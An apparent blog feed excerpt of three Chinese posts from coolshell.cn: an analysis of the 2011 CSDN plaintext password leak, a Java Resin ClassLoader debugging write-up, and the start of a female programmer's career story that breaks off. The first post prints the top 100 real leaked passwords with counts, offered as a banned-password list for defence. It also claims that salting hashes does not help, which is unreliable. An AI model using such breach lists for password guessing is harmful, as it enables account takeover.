<p>其实，CSDN明文密码并不是什么稀奇的事情，我是2000年注册CSDN的吧，当时找回口令的机制就是把口令直接传回来了，这一定是明文了。去年去CSDN参加移动互联网沙龙的时候，范凯和蒋涛说过明文密码的事，不过他们说的是很早以前的事了，而且一笔带过了。1年后的今天，事情又暴了，可见，“出来混的，迟早是要还的”这句话是几近真理的。</p>
<p>我在以前的BLOG里就提到过CSDN的明文密码（在“<a title="你会做Web上的用户登录功能吗？" href="https://coolshell.cn/articles/5353.html">如何设计用户登录功能</a>”一文）和 帐号泄露（“<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html">如何设计自己的口令</a>”） 的事（<strong>由此可见，酷壳里的很多文章里的事都应验了</strong>，因为我知道“出来混的，迟早是要还的”）</p>
<p>（<strong>可悲吧？还是程序员的网站呢，明文口令和用户信息泄露有悖于一个程序员网站的称号</strong>）</p>
<h4>泄露的密码分析</h4>
<p>我昨晚下载了<a href="http://www.csdn.net.sql">www.csdn.net.sql</a>文件，并分析了一下这个文件，经过各种awk, grep, sort, uniq, sed后，下面是我看到的东西：</p>
<ul>
<li>有近45万的用户使用 123456789 和 12345678 做口令。</li>
<li>有近40万的用户使用自己的生日做口令。</li>
<li>有近15万的用户使用自己的手机号做口令。</li>
<li>有近25万的用户使用自己的QQ号做口令。</li>
<li>设置成弱口令的用户占了590万，也就是那种就算你用MD5或是SHA散列的也能很快就被暴力破解出来的口令。</li>
<li>只有8000多个用户的口令里在8个长度以上，并有大写字母，小写字母，数字，并不在字典表里。</li>
</ul>
<p>（很好，这回泄露的还不单单只是明文用户密码和用户邮件，还有用户的手机号，生日和QQ号。挺好的）</p>
<p>下面，我们来看一下top 100的口令是什么？（第一列是采用这个密码个数，第二列是密码，我擦 dearbook是什么啊）简单地看了一下，top 一万的口令都很SB。比如什么woshishui, 123abc, aaa123456，01010101，haohaoxuexi，msconfig 相当的2B，还有<a href="/cdn-cgi/l/email-protection#8bdbcbf8f8fcbbf9ef"><span class="__cf_email__" data-cfemail="a0f0e0d3d3d790d2c4">[email protected]</span></a>，q1w2e3r4t5，看似文艺，实际很2的口令…. （<strong>可悲吧？还是程序员的网站呢，自己设的口令有悖于一个程序员的称号</strong>）</p>
<p><span id="more-6193"></span></p>
<p style="padding-left: 30px;">235033 123456789<br>
212751 12345678<br>
76346 11111111<br>
45902 dearbook<br>
34953 00000000<br>
19986 123123123<br>
17791 1234567890<br>
15033 88888888<br>
6995 111111111<br>
5966 147258369<br>
5553 987654321<br>
5459 aaaaaaaa<br>
5145 1111111111<br>
5025 66666666<br>
4435 a123456789<br>
4096 11223344<br>
3667 1qaz2wsx<br>
3649 xiazhili<br>
3610 789456123<br>
3497 password<br>
3281 87654321<br>
3277 qqqqqqqq<br>
3175 000000000<br>
3143 qwertyuiop<br>
3094 qq123456<br>
3077 iloveyou<br>
3061 31415926<br>
2985 12344321<br>
2886 0000000000<br>
2826 asdfghjkl<br>
2797 1q2w3e4r<br>
2580 123456abc<br>
2578 0123456789<br>
2573 123654789<br>
2540 12121212<br>
2515 qazwsxedc<br>
2396 abcd1234<br>
2380 12341234<br>
2348 110110110<br>
2298 asdasdasd<br>
2243 22222222<br>
2166 123321123<br>
2160 abc123456<br>
2145 123456<br>
2138 a12345678<br>
2113 123456123<br>
2106 a1234567<br>
2100 1234qwer<br>
1989 qwertyui<br>
1986 123456789a<br>
1971 aa123456<br>
1918 asdfasdf<br>
1891 99999999<br>
1859 999999999<br>
1859 123456aa<br>
1854 123456123456<br>
1699 520520520<br>
1656 963852741<br>
1652 741852963<br>
1652 55555555<br>
1589 33333333<br>
1480 qwer1234<br>
1384 asd123456<br>
1339 77777777<br>
1316 qweasdzxc<br>
1285 code8925<br>
1273 11112222<br>
1268 ms0083jxj<br>
1245 zzzzzzzz<br>
1214 111222333<br>
1206 qweqweqwe<br>
1200 3.1415926<br>
1183 123456qq<br>
1148 147852369<br>
1136 521521521<br>
1121 asdf1234<br>
1111 123698745<br>
1109 1123581321<br>
1058 asdfghjk<br>
1054 q1w2e3r4<br>
1038 12345678a<br>
1003 woaini1314<br>
991 1234abcd<br>
988 123qweasd<br>
975 1qazxsw2<br>
967 woaiwojia<br>
920 321321321<br>
910 05962514787<br>
894 123456987<br>
892 kingcom5<br>
882 zxcvbnm123<br>
882 5845201314<br>
853 0987654321<br>
847 wwwwwwww<br>
835 11111111111111111111<br>
805 12345600<br>
783 11235813<br>
777 1q2w3e4r5t<br>
772 10101010<br>
770 123456asd</p>
<h4>老生长谈安全问题</h4>
<p>从酷壳出现开始我就在老生长谈用户安全的东西了，今天借着这个事，大家再去重温一下酷壳的文章吧：</p>
<ul>
<li>
<a title="Twitter的禁用口令" href="https://coolshell.cn/articles/2451.html">Twitter禁用的口令</a>。看看去吧，一个好的网站应该如何引导用户设置强口令。Apple ID也是这样，需要你输入的口令有大小写，数字，非数字和字母，等等。<strong>今天CSDN的这个列表应该成为各大网站“口令禁用列表”。</strong>
</li>
</ul>
<ul>
<li>有朋友说，明文口令是巨2的一件事，是的。我可以告诉你，这个明文口令有可能存在于所有国内的网站上，比如：QQ，新浪，人人，开心，天涯……。<strong>对于安全问题，你要做最坏的假设，鲁迅先生说过：“不惮以最坏的恶意来推测中国人”，所以，对于中国的网站你要做如下最坏假设：1）其以明文存我的口令，2）其内部不良员工会把我的信息泄露出去</strong>。不信你可以看看下面的某QQ群里的截图：（<a href="https://weibo.com/1494759712/xDa7tah7E?type=repost" target="_blank">看看多玩网明文口令的消息吧</a>，<a href="https://weibo.com/1642471052/xDaC1dEhP?type=repost" target="_blank">再看看这个消息吧</a> QQ邮箱和QQ号的）<img alt="image placeholder" >
</li>
</ul>
<ul>
<li>你可能会说用MD5和SHA散列口令就好了，这个只比明文好一点点，因为有rainbow table，国外的号称达到99%覆盖，国内的达到93%覆盖。你加salt也没有用。就算我只能拿得到你的被散列的密码，没有rainbow和salt，我一样可以使用暴力破解，甚至就是尝试一下字典里的密码就可以了。这会非常快的，你可以看看本站的这篇文章“<a title="破解你的口令" href="https://coolshell.cn/articles/3801.html" target="_blank">破解你的口令</a>”，<strong>现在暴力破解MD5和SHA的口令很快的，因为MD5和SHA性能太好了。</strong>所以，你需要看看“<a title="如何防范密码被破解" href="https://coolshell.cn/articles/2078.html" target="_blank">如何防范密码被破解</a>”，其会告诉你加密口令要用一个性能差的算法——bcrypt。（也可以参看<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html">Web开发中需要了解的东西</a>中的<a href="http://codahale.com/how-to-safely-store-a-password/" target="_blank">如何安全保存口令一文</a>）</li>
</ul>
<ul>
<li>所以，你有必要地读一读我的这篇“<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html">如何管理和设计自己的口令</a>”，不要在同一网站上使用相同的口令，把口令的级别分好的组。自己管理好自己的口令。</li>
</ul>
<ul>
<li> 对于Web用户的安全问题，程序员们一定要看一下 这两篇文章，你要是不看的话，你没有资格开发Web项目。</li>
<ul>
<li><a title="你会做Web上的用户登录功能吗？" href="https://coolshell.cn/articles/5353.html">如何设计用户登录功能</a></li>
<li><a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html">Web开发中需要了解的东西</a></li>
</ul>
</ul>
<ul>
<li>当你看过 <a title="你会做Web上的用户登录功能吗？" href="https://coolshell.cn/articles/5353.html">如何设计用户登录功能</a> 一文后，你一定会头晕的，所以，我想告诉你，<strong>这种事情最好不要自己干，使用OpenID 和 OAuth吧，人家把这事干到了极致了</strong>。而且这样会带来两个好处：</li>
<ul>
<li>
<strong>用户不需要自己维护和管理一套新的帐号</strong>。</li>
<li>
<strong>用户的资料放在国外，从政治上来说是安全的</strong>。（八卦一下：Google总部要求中国谷歌所有开发团队不得在本地保存用户的信息）</li>
</ul>
</ul>
<ul>
<li>再说一点，再说说如何让自己内部的用户数据不会被不良员工外泄。<strong>所有的开发团队都不允许直接操作用户的数据库，只允许通过安全的接口来验证用户，用户信息的数据库中需要对操作者有审计功能，永远不允许不受信的人或操作进行全库扫描</strong>。当然，我相信，国内的开发团队绝对达不到这一步（包括某些银行）。</li>
</ul>
<ul>
<li>再说一下，<strong><span style="color: #000000;">真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞</span>。</strong>比如：通过很多方法“耦合”和银行和电信其是别的第三方的安全策略，比如，让用户绑定邮箱，绑定手机，绑定信用卡等。</li>
</ul>
<p>最后说一下，CSDN在这次事件的表现看上去还是很不错的，道歉也很诚恳，<strong>但是，我还是希望CSDN反思一下为什么数据库会泄露了？内部有不良员工？还是系统不安全被黑？不要只是诚恳道歉，还要找自己的原因。其它的网站可能就很恶劣了。包括新浪，人人，开心等，最恶心的就是腾讯，你说他的安全有问题，他还找一堆人来骂你。</strong></p>
<p style="text-align: center;"><span style="color: #cc0000; font-size: 16pt; font-family: 'Microsoft YaHei';"><strong>祝大家新年快乐！</strong></span></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-12-22T12:08:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/6193.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 由一个问题到 Resin ClassLoader 的学习 ]]></title>
<link>https://coolshell.cn/articles/6112.html</link>
<content><![CDATA[ 
<p><strong>（<span style="color: #cc0000;">感谢网友 liuxiaori 分享其经历</span>）<br>
</strong></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E8%83%8C%E6%99%AF" title="背景">背景</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%8F%91%E5%B1%95" title="发展">发展</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%BB%93%E8%AE%BA" title="结论">结论</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%96%91%E9%97%AE" title="疑问">疑问</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Resin%E4%B8%AD%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8" title="Resin中类加载器">Resin中类加载器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E9%A1%BA%E5%BA%8F" title="类加载器顺序">类加载器顺序</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%83%8C%E6%99%AF"></span>背景<span class="ez-toc-section-end"></span>
</h4>
<p>某日临近下班，一个同事欲取任何类中获取项目绝对路径，不通过Request方式获取，可是始终获取不到预想的路径。于是晚上回家google了一下，误以为是System.getProperty(“java.class.path”)-未实际进行测试，早上来和同事沟通，提出了使用这个内置方法，结果人家早已验证过，该方法是打印出CLASSPATH环境变量的值。</p>
<p>于是乎，继续google，找到了Class的getResource与getResourceAsStream两个方法。这两个方法会委托给ClassLoader对应的同名方法。以为这样就可以搞定(实际上确实可以搞定)，但验证过程中却发生了奇怪的事情。</p>
<p>软件环境：Windows XP、Resin 3、Tomcat6.0、Myeclipse、JDK1.5</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%91%E5%B1%95"></span>发展<span class="ez-toc-section-end"></span>
</h4>
<p>我的验证思路是这样的：</p>
<ol>
<li>定义一个Servlet，然后在该Servlet中调用Path类的getPath方法，getPath方法返回工程classpath的绝对路径，显示在jsp中。</li>
<li>另外在Path类中，通过Class的getResourceAsStream读取当前工程classpath路径中的a.txt文件，写入到getResource路径下的b.txt。</li>
</ol>
<p>由于时间匆忙，代码没有好好去组织。大致能看出上述两个功能，很简单不做解释。</p>
<p><span id="more-6112"></span></p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class Path {
    public String getPath() throws IOException
    {
        InputStream is = this.getClass().getResourceAsStream("/a.txt");
        File file = new File(Path.class.getResource("/").getPath()+"/b.txt");
        OutputStream os = new FileOutputStream(file);
        int bytesRead = 0;
        byte[] buffer = new byte[8192];
        while ((bytesRead = is.read(buffer, 0, 8192)) != -1) {
            os.write(buffer, 0, bytesRead);
        }
        os.close();
        is.close();
        return this.getClass().getResource("/").getPath();
    }
}
</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PathServlet extends HttpServlet {
    private static final long serialVersionUID = 4443655831011903288L;
    public void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException
    {
        Path path = new Path();
        request.setAttribute("path", path.getPath());
        PrintWriter out = response.getWriter();
        out.println("Class.getResource('/').getPath():" + path.getPath());
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException
    {
        doGet(request, response);
    }
}</pre>
<p>在此之前使用main函数测试Path.class.getResource(“/”).getPath()打印出预想的路径为：/D:/work/project/EhCacheTestAnnotation/WebRoot/WEB-INF/classes/</p>
<p>于是将WEB应用部署到Resin下，运行定义好的Servlet，出乎意料的结果是：/D:/work/resin-3.0.23/webapps/WEB-INF/classes/ 。特别奇怪，怎么会丢掉项目名称：EhCacheTestAnnotation呢？</p>
<p>还有一点值得注意，getPath方法中使用getResourceAsStream(“/a.txt”)却正常的读到了位于下图的a.txt。<br>
<img alt="image placeholder" ></p>
<p style="text-align: center;">然后写到了如下图的b.txt中。代码中是这样实现的：File file = new File(Path.class.getResource(“/”).getPath()+”/b.txt”);本意是想在a.txt文件目录下入b.txt。结果却和料想的不一样。<br>
<img alt="image placeholder" ></p>
<p>请注意，区别还是丢掉了项目名称。</p>
<p>写的比较乱，稍微总结下：</p>
<p>程序中使用ClassLoader的两个方法：getResourceAsStream和getResource。但是事实证明在WEB应用的场景下却得到了不同的结果。大家别误会啊，看名字他们两个方法肯定不一样，这个我知道，但是getResourceAsStream总会获取指定路径下的文件吧，示例中的参数为”/a.txt”，正确读取“/D:/work/resin-3.0.23/webapps/EhCacheTestAnnotation/WEB-INF/classes/ ”下的a.txt，可是将文件写到getResource方法的getPath返回路径的b.txt文件。两个位置的差别在项目名称(EhCacheTestAnnotation)。</p>
<p>这样我暂且得出一个结论：通过getResourceAsStream和getResource两个方法获取的路径是不同的。但是为什么呢？</p>
<p>于是查看了ClassLoader的源码，贴出getResource和getResourceAsStream的源码。</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public URL getResource(String name) {
    URL url;
    if (parent != null) {
        url = parent.getResource(name);
    } else {
        url = getBootstrapResource(name);
    }

    if (url == null) {
        url = findResource(name);
    }
    return url;
}

public InputStream getResourceAsStream(String name) {
    URL url = getResource(name);
    try {
        return url != null ? url.openStream() : null;
    } catch (IOException e) {
        return null;
    }
}</pre>
<p>从代码中看，getResourceAsStream将获取URL委托给了getResource方法。天啊，这是怎么回事儿？由此我彻底迷茫了，百思不得其解。</p>
<p>但是没有因此就放弃，继续回想了一遍整个过程：</p>
<ol>
<li>在main函数中，测试getResource与getResourceAsStream是完全相同的，正确的。</li>
<li>将其部署到Resin下，导致了getResource与getResourceAsStream获取的路径不一致。</li>
</ol>
<p>一个闪光点，是不是与web容器有关啊，于是换成Tomcat6.0。OMG，“奇迹”出现了，真的是这样子啊，换成Tomcat就一样了啊！和预想的一致。</p>
<p style="text-align: center;">在Tomcat下运行结果如下图：<br>
<img alt="image placeholder" ></p>
<p>对，这就是我想要的。</p>
<p>因此我对Resin产生了厌恶感，之前也因为在Resin下程序报错，在Tomcat下正常运行而纠结了好久。记得看《松本行弘的程序世界》中对C++中的多继承是这样评价的(大概意思)：多重继承带来的负面影响多数是由于使用不当造成的。是不是因为对Resin使用不得当才使得和Tomcat下得到不同的结果。</p>
<p>最终，在查阅Resin配置文件resin.conf时候在&lt;host-default&gt;标签下发现了这样一段：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;class-loader&gt;
&lt;compiling-loader path="webapps/WEB-INF/classes"/&gt;
&lt;library-loader path="webapps/WEB-INF/lib"/&gt;
&lt;/class-loader&gt;</pre>
<p>其中的compiling-loader很可能与之有关，遂将其注释掉，一切正常。担心是错觉，于是将compiling-loader的path属性改成：webapps/WEB-INF/classes1，然后运行pathServlet，b.txt位置如下图：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>确实与compiling-loader有关。</p>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E8%AE%BA"></span>结论<span class="ez-toc-section-end"></span>
</h4>
<p>终于通过将&lt;class-loader&gt;标签注释掉，同样可以在Resin中获取“预想”的路径。验证了的确是使用Resin的人出了问题。</p>
<h4>
<span class="ez-toc-section" id="%E7%96%91%E9%97%AE"></span>疑问<span class="ez-toc-section-end"></span>
</h4>
<div>
<p>但是没有这样就结束，我继续对getResource的源码进行了跟进，由于能力有限，没有弄清楚getResource的原理。</p>
<p>最终留下了两个疑问：</p>
<p>1、如果追踪到getResource方法的最底层(也许是JVM层面)，它实现的原理是什么？</p>
<p>2、为何Resin中&lt;class-loader&gt;的配置会对getResource产生影响，但是对getResourceAsStream毫无影响(getResourceAsStream可是将获取路径委托给getResource的啊)。还是这里我理解或者使用错误了？</p>
<p>本来文章到这里就结束了，本来是想问问牛人的，但是这个问题引起了很多的好奇心，于是我又花了一两周做了下面的调查。</p>
<h4>
<span class="ez-toc-section" id="Resin%E4%B8%AD%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"></span>Resin中类加载器<span class="ez-toc-section-end"></span>
</h4>
<p>在我了解的<span style="font-family: 'Times New Roman';">ClassLoader</span><span style="font-family: 宋体;">是在</span>com.caucho.loader包下，结构请看下图：<br>
<img alt="image placeholder" ><br>
图1<br>
<a href="https://coolshell.cn/wp-content/uploads/2011/12/resin06.png"><img alt="image placeholder" ></a><br>
图2</p>
<p>从上面两幅图中可以看出，图1是与Jdk有关联的，继承自java.net.URLClassLoader。DynamicClassLoader的注释是这样的：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">/**
* Class	loader which checks for changes in class files and automatically
* picks up new jars.
*
* DynamicClassLoaders can be chained creating one virtual class loader.
* From the perspective of the JDK, it's all one classloader.  Internally,
* the class loader chain searches like a classpath.
*/
</pre>
<p>EnvironmentClassLoader又继承了DynamicClassLoader<span style="font-family: 宋体;">。</span></p>
<p>图<span style="font-family: 'Times New Roman';">2</span><span style="font-family: 宋体;">应该是</span><span style="font-family: 'Times New Roman';">Resin</span><span style="font-family: 宋体;">本身的</span><span style="font-family: 'Times New Roman';">ClassLoader</span><span style="font-family: 宋体;">，其中</span><span style="font-family: 'Times New Roman';">Loader</span><span style="font-family: 宋体;">是一个抽象类，包含了各种子类类加载器。</span></p>
<p>从两幅图中是看不出<span style="font-family: 'Times New Roman';">Resin</span><span style="font-family: 宋体;">自身的</span><span style="font-family: 'Times New Roman';">Loader</span><span style="font-family: 宋体;">体系与继承自</span><span style="font-family: 'Times New Roman';">JVM</span><span style="font-family: 宋体;">的类加载器存在关系，那是不是他们就不存在某种关联呢？其实不是这样子的。请看下面</span><span style="font-family: 'Times New Roman';">DynamicClassLoader</span><span style="font-family: 宋体;">源码的片段：</span></p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// List of resource loaders
private ArrayList _loaders = new ArrayList();
private JarLoader _jarLoader;
private PathLoader _pathLoader;
</pre>
<p>清楚了吧，这两个Loader<span style="font-family: 宋体;">分支通过组合的方式协作。</span></p>
<h4>
<span class="ez-toc-section" id="%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E9%A1%BA%E5%BA%8F"></span>类加载器顺序<span class="ez-toc-section-end"></span>
</h4>
<p>既然<span style="font-family: 'Times New Roman';">Resin</span><span style="font-family: 宋体;">标准的</span><span style="font-family: 'Times New Roman';">Loader</span><span style="font-family: 宋体;">及其子类以组合的方式嵌入到</span><span style="font-family: 'Times New Roman';">DynamicClassLoader</span><span style="font-family: 宋体;">中，那么在加载一个“资源”时，</span><span style="font-family: 'Times New Roman';">Loader</span><span style="font-family: 宋体;">分支和</span><span style="font-family: 'Times New Roman';">java.net.URLClassLoader</span><span style="font-family: 宋体;">分支的先后顺序是什么样子的呢？</span></p>
<p>首先使用下面这段代码，将类加载器名称打印到控制台：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">ClassLoader loader = PathServlet.class.getClassLoader();
while (loader != null) {
    System.out.println(loader.toString());
    loader = loader.getParent();
}
</pre>
<p>输出的结果为：</p>
<blockquote>
<p><em>EnvironmentClassLoader[web-app:http://localhost:8080/Test]</em></p>
<p><em><em>EnvironmentClassLoader[web-app:http://localhost:8080]</em></em></p>
<p><em>EnvironmentClassLoader[cluster ]</em></p>
<p><em><em>EnvironmentClassLoader[]</em></em></p>
<p><em><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9be8eef5b5f6f2e8f8b5d7faeef5f8f3fee9bfdaebebd8f7fae8e8d7f4fafffee9dbf8faf8a9ada3">[email protected]</a></em></p>
<p><em><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b7c4c2d999dadec4d499fbd6c2d9d4dfd2c593f2cfc3f4dbd6c4c4fbd8d6d3d2c5f786d686818f818e">[email protected]</a></em></p>
</blockquote>
<p>额，没有任何一个Resin<span style="font-family: 宋体;">的</span><span style="font-family: 'Courier New';">Loader</span><span style="font-family: 宋体;">被打印出来啊，对头，有就错了。下面就让我们看看</span><span style="font-family: 'Courier New';">DynamicClassLoader</span><span style="font-family: 宋体;">中</span><span style="font-family: 'Courier New';">getResource</span><span style="font-family: 宋体;">的源码来解答。</span></p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">/**
* Gets the named resource
*
* @param name name of the resource
*/

public URL getResource(String name)
{
    if (_resourceCache == null) {
        long expireInterval = getDependencyCheckInterval();
        _resourceCache = new TimedCache(256, expireInterval);
    }

    URL url = _resourceCache.get(name);
    if (url == NULL_URL)
        return null;
    else if (url != null)
        return url;

    boolean isNormalJdkOrder = isNormalJdkOrder(name);

    if (isNormalJdkOrder) {
    url = getParentResource(name);
    if (url != null)
        return url;
    }

    ArrayList loaders = _loaders;
    for (int i = 0; loaders != null &amp;&amp; i &lt; loaders.size(); i++) {
        Loader loader = loaders.get(i);
        url = loader.getResource(name);

        if (url != null) {
            _resourceCache.put(name, url);
            return url;
        }

    }

    if (! isNormalJdkOrder) {
        url = getParentResource(name);
        if (url != null)
            return url;
    }

    _resourceCache.put(name, NULL_URL);
    return null;
}

</pre>
<p>代码不难懂，我画了一张流程图，不规范，凑合看下。<br>
<img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">boolean isNormalJdkOrder = isNormalJdkOrder(name);
</pre>
<p>这行代码控制着Resin<span style="font-family: 宋体;">类加载的顺序，如果是常规的类加载顺序</span><span style="font-family: 'Courier New';">(</span><span style="font-family: 宋体;">向上代理，原文：</span>Returns true if the class loader should use the normal order, i.e. looking at the parents first.)<span style="font-family: 宋体;">，则先</span>url = getParentResource(name)，后遍历_loaders。否则是按照先遍历_loaders<span style="font-family: 宋体;">再</span>url = getParentResource(name)向上代理。</p>
<p>在我的调试经历中，一直都是先向上代理，后遍历_loaders<span style="font-family: 宋体;">的顺序，未遇到第二种方式。</span></p>
<p>文字对先向上代理，后遍历的顺序做点儿说明：</p>
<ol>
<li>首先使用“最上层”的<em><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83f0f6edadeeeaf0e0adcfe2f6ede0ebe6f1a7c6fbf7c0efe2f0f0cfece2e7e6f1c3b2e2b2b5bbb5ba">[email protected]</a></em>加载name<span style="font-family: 宋体;">资源，如果找到就返回</span><span style="font-family: 'Courier New';">URL</span><span style="font-family: 宋体;">否则返回</span><span style="font-family: 'Courier New';">null</span>
</li>
<li>程序返回到<em><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e390968dcd8e8a9080cdaf82968d808b8691c7a29393a08f829090af8c82878691a3808280d1d5db">[email protected]</a></em>，首先判断父类加载器返回的<span style="font-family: 'Courier New';">url</span><span style="font-family: 宋体;">是否为</span><span style="font-family: 'Courier New';">null</span><span style="font-family: 宋体;">，如果不为</span><span style="font-family: 'Courier New';">null</span><span style="font-family: 宋体;">则返回</span><span style="font-family: 'Courier New';">url</span><span style="font-family: 宋体;">，返回</span><span style="font-family: 'Courier New';">null</span><span style="font-family: 宋体;">。</span>
</li>
<li><span style="font-family: 宋体;"><em><em><em>EnvironmentClassLoader[]</em></em></em></span></li>
<li>程序返回到<em>EnvironmentClassLoader[cluster ]</em>的getParentResource<span style="font-family: 宋体;">，再返回到</span><span style="font-family: 'Courier New';">getResource</span><span style="font-family: 宋体;">，如果</span><span style="font-family: 'Courier New';">url</span><span style="font-family: 宋体;">不为</span><span style="font-family: 'Courier New';">null</span><span style="font-family: 宋体;">，则直接返回，否则遍历</span>ArrayList&lt;Loader&gt; loaders = _loaders;从各个loader<span style="font-family: 宋体;">中加载</span><span style="font-family: 'Courier New';">name</span><span style="font-family: 宋体;">，如果加载成功，即不为</span><span style="font-family: 'Courier New';">null</span><span style="font-family: 宋体;">，则返回，否则继续遍历，直至遍历完成。</span>
</li>
<li>
<em><em>EnvironmentClassLoader[web-app:http://localhost:8080]</em></em>同4</li>
<li>
<em>EnvironmentClassLoader[web-app:http://localhost:8080/Test]</em>同4</li>
</ol>
<p>OK<span style="font-family: 宋体;">，完事儿，后续还有，准备好好写几篇。</span></p>
<p>本文同时发布于：</p>
<ul>
<li>
<a href="https://www.oschina.net/question/129471_34225">http://www.oschina.net/question/129471_34225</a>。</li>
<li><a href="https://www.oschina.net/question/129471_35231#AnchorAnswer143898">http://www.oschina.net/question/129471_35231#AnchorAnswer143898</a></li>
</ul>
</div>
<p style="text-align: left;">（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2011-12-28T12:22:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/6112.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个女程序员的故事 ]]></title>
<link>https://coolshell.cn/articles/6312.html</link>
<content><![CDATA[ 
<p>因为有人在<a href="https://coolshell.cn/articles/6142.html/comment-page-3#comment-113607" target="_blank">酷壳里评论</a>里说我给一个女程序员的建议不靠谱，我不服，因为我的工作经历中的一些女程序员都很不错，比那些男程序员都强，所以，我在<a href="https://weibo.com/1401880315/xE597iX6J" target="_blank">新浪微博</a>和<a href="https://twitter.com/#!/haoel/status/151856699387547649" target="_blank">twitter</a>上征集女程序员的故事和想法，这两天来，我收到了好几封邮件，让我很感动。其中，有一个故事让我回味很久，在脑海里挥之不去，可能是因为她的经历和我很相似，她的想法和我很有共鸣。</p>
<p>本来，我想通过收到的这些故事然后编辑成一篇关于女程序员的文章，但是我觉得这个故事已经足够好了，任何的编辑都是对这个故事的不尊重，所以，我原封不动，一字不改地把这个故事转到这里。我把一些我认为精彩的地方加了粗。</p>
<p>当然，我还是会再写一篇关于女程序员的文章，酷壳2011年底的最后篇文章和2012年的第一篇文章都是给女程序员的，因为，我为你们骄傲！</p>
<p style="padding-left: 30px;"><span style="color: #000000;">从哪里说起呢，我的程序员之路。有些话只是自己心里想的很明白，还从没说过。希望你有耐心看完，因为我的故事不精彩，也算不上奋斗史。我的文笔和叙事能力也很差。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">高中报志愿的时候坚定的报了计算机技术及应用，当时对计算机的认识只是机房里的苹果机，和老师教的用basic 输出一个正方形之类的。 我当时觉得我对计算机一无所知，我想了解他，就选择了这个专业，当然当时程序员的收入也是可观的。 ：）</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">大学四年下来，我的成绩不好，基础也不好，没拿过奖学金。大学的课程很多不喜欢，我不知道为什么计算机系还要学高等物理，和马列毛邓。这是题外话。说实在的，很多课上的我一头雾水。毕业后找工作不满意，我直接去读了软件工程（考研的专业课成绩没到线）。两年制，一年上课，一年实习。我想给自己的履历上增加一些至少能给我面试机会的经历。（我仔细思考过我成绩不好的原因，心里因素是主要的，高中在重点中学，我不能接受自己不是尖子生的事实，总在想自己为什么这么差，以至于这样的心情影响了我很多年，一直到工作后的几年）</span></p>
<p><span id="more-6312"></span></p>
<p style="padding-left: 30px;"><span style="color: #000000;"><strong>实习的第一家公司是个私企，工作两周后他们不满意辞退了我，沮丧是当然的，我知道我的能力是有差距的。虽然他们没有任何培训，直接拉去干活，起码的业务流程也没给我讲，但是我真的发自内心感谢他们辞了我，让我认清了自己</strong>。其实当时干的就是一些perl 脚本和php的网页开发。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">实习的第二家也是私企，给运营商做项目。我参加的是一个工作流项目，用java开发。我当时的java技术仅限书本身的不怎么牢靠基础知识，至于怎么设计这个系统也没有一点概念，终于一个月后我决定退出了。<strong>经过这一个多月，我似乎知道了自己该从哪里开始了。就从java开始吧</strong>。</span></p>
